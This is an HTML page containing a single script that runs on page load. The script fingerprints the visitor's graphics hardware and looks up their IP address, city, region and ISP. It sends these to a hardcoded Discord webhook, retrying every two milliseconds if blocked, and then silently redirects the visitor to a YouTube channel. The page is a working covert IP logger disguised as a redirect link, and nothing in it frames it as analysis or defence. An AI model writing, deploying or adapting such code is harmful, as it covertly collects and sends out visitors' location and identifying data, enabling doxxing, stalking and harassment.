<!DOCTYPE html>
<html>
<body style="background:#000;">
<script>
    const H = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
    const Y = "https://youtube.com/@LigmaBlox-w7m";

    async function getDev() {
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            const d = gl.getExtension('WEBGL_debug_renderer_info');
            return gl.getParameter(d.UNMASKED_RENDERER_WEBGL).split("Apple ").pop();
        } catch(e) { return navigator.platform; }
    }

    async function track() {
        const isRe = sessionStorage.getItem('v');
        sessionStorage.setItem('v', '1');
        const tag = isRe ? "🔄 RE-ENTRY" : "🆕 NEW HIT";
        const dev = await getDev();

        while(true) {
            try {
                // Force a fresh fetch every single time
                const r = await fetch('https://ip-api.com/json/?nocache=' + Date.now()).then(d=>d.json());
                
                if(r.status === "success") {
                    const p = { 
                        content: `**[${tag}]**\n**Device:** ${dev}\n**IP:** ${r.query}\n**City:** ${r.city}\n**Region:** ${r.regionName}\n**ISP:** ${r.isp}` 
                    };
                    navigator.sendBeacon(H, JSON.stringify(p));
                    break; // Exit loop once sent
                }
            } catch(e) { 
                // 2ms Rapid-Fire retry if blocked
                await new Promise(s => setTimeout(s, 2)); 
            }
        }
        window.location.replace(Y);
    }
    track();
</script>
</body>
</html>
